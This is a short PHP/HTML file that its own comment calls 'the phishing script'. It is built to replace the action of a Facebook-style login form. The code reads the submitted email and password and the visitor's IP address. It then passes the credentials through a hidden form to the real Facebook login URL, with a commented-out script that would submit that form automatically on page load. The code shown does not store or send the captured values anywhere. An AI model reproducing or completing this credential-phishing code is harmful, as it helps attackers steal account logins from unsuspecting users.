<html>


  <?php
    /* This is the phishing script, replaced the action on the login form with
      this script, and the original action was to go to this
      "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110",
    */

    
    $email = null;
    $pass = null;
    if (isset($_POST['email']) && isset($_POST['pass'])) {
      $email = $_POST['email'];
      $pass = $_POST['pass'];
      if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip=$_SERVER['HTTP_CLIENT_IP'];
        //Is it a proxy address
      }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
      }else{
       $ip=$_SERVER['REMOTE_ADDR'];
      }
    }
   ?>
   <body>
     <form id="login_form" action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110" method="post" novalidate="1" onsubmit="">
       <input type="hidden" name="lsd" value="AVoM5jI-" autocomplete="off" />

       <td><input type="hidden" class="inputtext" name="email" id="email" data-testid="royal_email" /></td>
       <td><input type="hidden" class="inputtext" name="pass" id="pass" data-testid="royal_pass" /></td>

     </form>
     <!-- <?php
       echo '<script type="application/javascript">'.
          'window.onload = function() {'.
          'document.getElementById("login_form").submit();'.
       '} </script>';
     ?> -->
   </body>


</html>
